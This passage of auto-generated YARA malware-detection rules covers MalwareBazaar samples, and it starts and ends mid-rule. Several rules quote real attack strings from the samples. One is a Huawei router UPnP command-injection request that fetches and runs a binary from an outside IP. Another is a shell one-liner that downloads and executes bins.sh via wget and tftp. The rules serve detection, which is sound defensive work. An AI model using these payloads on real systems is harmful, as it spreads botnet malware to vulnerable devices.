        description = "Auto ML: f7023ac898d727474c62ce2496df6131d349bb957bfc5f88d1dbd1886defafd2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "+SsLsKvUB"
        $s5 = "I66xg9T&fqrrE0Y0nMVIuCffR4=Oti+PsLsOvUB71vc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1050KB
        and all of them
}

rule Android_f7199741396138635bb8dcff3d2594927a71d9a432581987c30b98438575aefa
{
    meta:
        description = "Auto ML: f7199741396138635bb8dcff3d2594927a71d9a432581987c30b98438575aefa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "META-INF/com/android/build/gradle/app-metadata.propertiesK,("
        $s2 = "M-ILI,I"
        $s3 = "classes.dex,"
        $s4 = "C 0wa 06N"
        $s5 = "qLf6KX"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 2521KB
        and all of them
}

rule Windows_f72233b9518367bd3858ba7a54c631dfcb7090b3e8dac552ca4e7928cc9ea68a
{
    meta:
        description = "Auto ML: f72233b9518367bd3858ba7a54c631dfcb7090b3e8dac552ca4e7928cc9ea68a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1424KB
        and all of them
}

rule Linux_175064bbfaf46aec266fd70963f822463695ec74bbe99b39286ef1b0b5c60564
{
    meta:
        description = "Auto ML: 175064bbfaf46aec266fd70963f822463695ec74bbe99b39286ef1b0b5c60564"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB
        and all of them
}

rule Linux_f747d6c7d375568d3b4936ffb0938445ba3da2b138d059d717c8a5cbc97e6cdc
{
    meta:
        description = "Auto ML: f747d6c7d375568d3b4936ffb0938445ba3da2b138d059d717c8a5cbc97e6cdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "D$TPhH"
        $s2 = "xAPPSh@"
        $s3 = "D$,Phx"
        $s4 = "u%WWSS"
        $s5 = "PPSh`t"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB
        and all of them
}

rule Linux_f76f3d2a4869993480d8d78173440b74d79206085f27d43c2531faffe99121e6
{
    meta:
        description = "Auto ML: f76f3d2a4869993480d8d78173440b74d79206085f27d43c2531faffe99121e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "uG!mg_XJ?}#"
        $s2 = "i+MFeZU7o"
        $s3 = "QQvU&0:"
        $s4 = "}mjRd|"
        $s5 = "wDlO+$"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB
        and all of them
}

rule Windows_f7728e0ce434d6b4537af34339b06d742766e574bce6b41a698725e3b9ec7f73
{
    meta:
        description = "Auto ML: f7728e0ce434d6b4537af34339b06d742766e574bce6b41a698725e3b9ec7f73"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich=`g"
        $s3 = "<Ar5<zw1<Zv"
        $s4 = "keQLbK"
        $s5 = "sO:8rE"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 242KB
        and all of them
}

rule Linux_f7907fd93577b22ba3be2f994e445c5eb196ebc474aa99e61d30a4a4c07dca16
{
    meta:
        description = "Auto ML: f7907fd93577b22ba3be2f994e445c5eb196ebc474aa99e61d30a4a4c07dca16"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 153KB
        and all of them
}

rule Linux_f7a8ef0ae5a7e627e6918ba3c92b9fd6b1d9ee8be73ec877ab8af0ef746406a0
{
    meta:
        description = "Auto ML: f7a8ef0ae5a7e627e6918ba3c92b9fd6b1d9ee8be73ec877ab8af0ef746406a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "ad34334in"
        $s3 = "us534534534er"
        $s4 = "lo54345534gin"
        $s5 = "ge534345345st"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 135KB
        and all of them
}

rule Windows_f7cdedd0c2255acdeec852eac9d0f27167cc48eff1d92d34fe099f3c7f21ae9a
{
    meta:
        description = "Auto ML: f7cdedd0c2255acdeec852eac9d0f27167cc48eff1d92d34fe099f3c7f21ae9a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "ribbonButton10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 958KB
        and all of them
}

rule Linux_f82baaec509d26a3548aa4450f94aad8c76722b1f1d41b1efa5b9d808b26c40e
{
    meta:
        description = "Auto ML: f82baaec509d26a3548aa4450f94aad8c76722b1f1d41b1efa5b9d808b26c40e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "0N^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "LNqNuO"
        $s5 = "*L,KHx"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 167KB
        and all of them
}

rule Windows_f85e153151e2d8379d57e66047fa65fff537db0f455effa92a2abb09a70e52fb
{
    meta:
        description = "Auto ML: f85e153151e2d8379d57e66047fa65fff537db0f455effa92a2abb09a70e52fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "+D+E+F+K"
        $s5 = "p+f&+mrp"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 877KB
        and all of them
}

rule Windows_f865504f075fc498d14904055734c4c5e70d9a852e9362414b1fff6a46fc9123
{
    meta:
        description = "Auto ML: f865504f075fc498d14904055734c4c5e70d9a852e9362414b1fff6a46fc9123"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1992KB
        and all of them
}

rule Linux_f86b41a0974788440d173afdc8eb9a2245edce873b0101c2f39941c3323770e1
{
    meta:
        description = "Auto ML: f86b41a0974788440d173afdc8eb9a2245edce873b0101c2f39941c3323770e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "Cookie:"
        $s4 = "[http flood] headers: \"%s\""
        $s5 = "/sbin/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB
        and all of them
}

rule Windows_1793b6d629599f4709ba967ebfc2e07e77bc42d07b475467fedd94c53dafafe0
{
    meta:
        description = "Auto ML: 1793b6d629599f4709ba967ebfc2e07e77bc42d07b475467fedd94c53dafafe0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "com.apple.Safari"
        $s5 = "Unable to resolve HTTP prox"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 237KB
        and all of them
}

rule Windows_f871f023c7864ce803def3b7ff3ddf709ce75f87cf9283a5ed81a3f51ab02d19
{
    meta:
        description = "Auto ML: f871f023c7864ce803def3b7ff3ddf709ce75f87cf9283a5ed81a3f51ab02d19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich)]p"
        $s3 = "`.data"
        $s4 = "@.didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1516KB
        and all of them
}

rule Windows_f8ab78e1db3a3cc3793f7680a90dc1d8ce087226ef59950b7acd6bb1beffd6e3
{
    meta:
        description = "Auto ML: f8ab78e1db3a3cc3793f7680a90dc1d8ce087226ef59950b7acd6bb1beffd6e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@.retplne"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 24033KB
        and all of them
}

rule Windows_f8b626d638c4f7dad13330557c49b148a42a54e8d96da1767c6b413c653ec445
{
    meta:
        description = "Auto ML: f8b626d638c4f7dad13330557c49b148a42a54e8d96da1767c6b413c653ec445"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichRe"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "Y;J:>Rl"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1988KB
        and all of them
}

rule Windows_f90db97e56f2eb46d2e55a0cd7674997bbc2d644f6370b477fd04edfca7b9cdd
{
    meta:
        description = "Auto ML: f90db97e56f2eb46d2e55a0cd7674997bbc2d644f6370b477fd04edfca7b9cdd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "t_aJ5W$"
        $s5 = "i_HM5W"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 446KB
        and all of them
}

rule Windows_f91f15faf187ed674aa20ad34350fdac00123db350bbb0e37993f1e15dc68009
{
    meta:
        description = "Auto ML: f91f15faf187ed674aa20ad34350fdac00123db350bbb0e37993f1e15dc68009"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Linux_f9269e614fa9f50bf9eb222daa97686ffc71018793d4cd84606ebf415ea4cd0f
{
    meta:
        description = "Auto ML: f9269e614fa9f50bf9eb222daa97686ffc71018793d4cd84606ebf415ea4cd0f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "RL8*GC"
        $s2 = "4w?BtJ"
        $s3 = "Z)rjv("
        $s4 = "Cu:<Cx^"
        $s5 = "d`mo@l"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 15KB
        and all of them
}

rule Windows_f94a12e629297139c866ad2396dc2d14bfb3f6ec51fcbb723cdb0e2c65e3fbcb
{
    meta:
        description = "Auto ML: f94a12e629297139c866ad2396dc2d14bfb3f6ec51fcbb723cdb0e2c65e3fbcb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhb4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB
        and all of them
}

rule Windows_f95b01b35d47756420ec9c626d56865c687323473b11e51f141277c746db03a0
{
    meta:
        description = "Auto ML: f95b01b35d47756420ec9c626d56865c687323473b11e51f141277c746db03a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".gelin"
        $s5 = ".lelofusA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB
        and all of them
}

rule Windows_f9743731cc0fd40863f11c5c6568f9412a5c3df75a3628a6df275b70b95afe08
{
    meta:
        description = "Auto ML: f9743731cc0fd40863f11c5c6568f9412a5c3df75a3628a6df275b70b95afe08"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "DF51EFD36C8F552B80C9E2B91433E8C96D4C4CBE3068D8D13405DB1020381641"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 696KB
        and all of them
}

rule Windows_f98cf9ee6e3f42fe35ec570b4728ecd65929ba24ba4c090c3b438c8de4677cc8
{
    meta:
        description = "Auto ML: f98cf9ee6e3f42fe35ec570b4728ecd65929ba24ba4c090c3b438c8de4677cc8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "+D+E+F+K"
        $s5 = "+U+Zz+a"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1529KB
        and all of them
}

rule Windows_17c7cc079465da191a8ed1512b8088b869415f5bc5bccf3eb72b0820b7f35619
{
    meta:
        description = "Auto ML: 17c7cc079465da191a8ed1512b8088b869415f5bc5bccf3eb72b0820b7f35619"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 428KB
        and all of them
}

rule Windows_f999d7af5fe48ff638c89bd5e726b42e89c1db97fc6563977523b506f96f05c8
{
    meta:
        description = "Auto ML: f999d7af5fe48ff638c89bd5e726b42e89c1db97fc6563977523b506f96f05c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "YYj0Xj"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1546KB
        and all of them
}

rule Windows_f9aa5c8b66fdab9dad594bf1b84aa90193efe5e5c4317f76118dd2e06b6202ae
{
    meta:
        description = "Auto ML: f9aa5c8b66fdab9dad594bf1b84aa90193efe5e5c4317f76118dd2e06b6202ae"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2287KB
        and all of them
}

rule Windows_fa102af99cc8e8cf91b02a251eb099637bba2112944c29896c0d40653bd7fe8d
{
    meta:
        description = "Auto ML: fa102af99cc8e8cf91b02a251eb099637bba2112944c29896c0d40653bd7fe8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2397KB
        and all of them
}

rule Windows_fa146cfe8c5719a3b2f0cd36f32334956da9fe4eb83aabc0a2ad6e88dd33b430
{
    meta:
        description = "Auto ML: fa146cfe8c5719a3b2f0cd36f32334956da9fe4eb83aabc0a2ad6e88dd33b430"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 560KB
        and all of them
}

rule Windows_faa08b9df237134013697a74026442e00ee185b8c8025f37e87238ecf5e2dc27
{
    meta:
        description = "Auto ML: faa08b9df237134013697a74026442e00ee185b8c8025f37e87238ecf5e2dc27"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "B.symtab"
        $s5 = ";cpu.u"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 14512KB
        and all of them
}

rule Windows_fab4d0b0d8e57ed2e88b7336bce24982ac1d0095a750e43a8725342d38efd5fb
{
    meta:
        description = "Auto ML: fab4d0b0d8e57ed2e88b7336bce24982ac1d0095a750e43a8725342d38efd5fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "SVWu:ff"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1672KB
        and all of them
}

rule Windows_fabb2f61d079f431599bc61ab386291dbe3da947531024e25b1737b6e7084c92
{
    meta:
        description = "Auto ML: fabb2f61d079f431599bc61ab386291dbe3da947531024e25b1737b6e7084c92"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "AM )UU"
        $s5 = "aefe -"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1011KB
        and all of them
}

rule Windows_fad4ad2b20d69fe58683c50e3f69e0278c37eae9f12cf81e44243a146361c082
{
    meta:
        description = "Auto ML: fad4ad2b20d69fe58683c50e3f69e0278c37eae9f12cf81e44243a146361c082"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "uBhrC@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 255KB
        and all of them
}

rule Linux_fae68a88bda7f46c1d4d4f4a02992b85a025017aabc6d4d3f153cd3e101a8fb3
{
    meta:
        description = "Auto ML: fae68a88bda7f46c1d4d4f4a02992b85a025017aabc6d4d3f153cd3e101a8fb3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "ad34334in"
        $s3 = "us534534534er"
        $s4 = "lo54345534gin"
        $s5 = "ge534345345st"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 114KB
        and all of them
}

rule Windows_faf860a503e3988eae118fcce67a6c37aa321bf9c6dd450e0fe641b8ca68a3e2
{
    meta:
        description = "Auto ML: faf860a503e3988eae118fcce67a6c37aa321bf9c6dd450e0fe641b8ca68a3e2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".clam01"
        $s4 = "PVVPPP"
        $s5 = "L$XSUPQ"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 173KB
        and all of them
}

rule Windows_17eb1a2f794ad5e02a0d96fcbd42fcfe328eb4a10bdda74d8e5cb1dfc46e4fa6
{
    meta:
        description = "Auto ML: 17eb1a2f794ad5e02a0d96fcbd42fcfe328eb4a10bdda74d8e5cb1dfc46e4fa6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "Boolean"
        $s3 = "SmNlInt"
        $s4 = "Nurrency"
        $s5 = "striR,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1565KB
        and all of them
}

rule Windows_fb0cedd17622c47554bc9fada82b2135838059aae5fa17ead92ab3fd222cfab5
{
    meta:
        description = "Auto ML: fb0cedd17622c47554bc9fada82b2135838059aae5fa17ead92ab3fd222cfab5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffZJ"
        $s5 = "eAFJ(:;"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 465KB
        and all of them
}

rule Linux_fb159c44bf12ac8f6f4b253973072935e7e463b626aaa45c8813b30f6b77fa8a
{
    meta:
        description = "Auto ML: fb159c44bf12ac8f6f4b253973072935e7e463b626aaa45c8813b30f6b77fa8a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "0N^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "@N^NuNV"
        $s5 = "LN^NuNV"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 85KB
        and all of them
}

rule Windows_fb4f050b02bffd952b6b8ea9bb0409fd203f620bf2a5b6a3327b934beaf10721
{
    meta:
        description = "Auto ML: fb4f050b02bffd952b6b8ea9bb0409fd203f620bf2a5b6a3327b934beaf10721"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lZ[YZ*"
        $s5 = "jZXi}f"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1556KB
        and all of them
}

rule Windows_fb51a9757a36a6d6d98d63546d481ebc0156947b859b12afb3b4afe612e06db9
{
    meta:
        description = "Auto ML: fb51a9757a36a6d6d98d63546d481ebc0156947b859b12afb3b4afe612e06db9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_fb631c667cdf59c841076c9bc2c4a55e4de46a5bdaf45d73842597808877dda1
{
    meta:
        description = "Auto ML: fb631c667cdf59c841076c9bc2c4a55e4de46a5bdaf45d73842597808877dda1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "|oRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "t}9>uyj"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 348KB
        and all of them
}

rule Windows_fba819d2e345ae62fe34712d79c24497380d5709433ac30573ad30318d6f2857
{
    meta:
        description = "Auto ML: fba819d2e345ae62fe34712d79c24497380d5709433ac30573ad30318d6f2857"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6852KB
        and all of them
}

rule Windows_fbcd47d1ae7422b87d525af8fb27fef6bf0946137d6e635e4be4adfd6a150f7e
{
    meta:
        description = "Auto ML: fbcd47d1ae7422b87d525af8fb27fef6bf0946137d6e635e4be4adfd6a150f7e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "m*ew7n[9D"
        $s5 = "gg]Cfg"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 793KB
        and all of them
}

rule Windows_fc033161f27b2a779ed33cd69173d269b141414ad57ea833fbe2e02f2503540d
{
    meta:
        description = "Auto ML: fc033161f27b2a779ed33cd69173d269b141414ad57ea833fbe2e02f2503540d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".venebaf"
        $s5 = ".jijunucA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 781KB
        and all of them
}

rule Windows_fc093b245007538a7359e050fda837ea9f19ddb9d53e310f9bcdfd2bc55b4f19
{
    meta:
        description = "Auto ML: fc093b245007538a7359e050fda837ea9f19ddb9d53e310f9bcdfd2bc55b4f19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "o;yw7<2SQ"
        $s5 = "6cXx6kd(QJ6+oB1ime65PWACsI=BPro8yw782SQOM2V"

    condition:
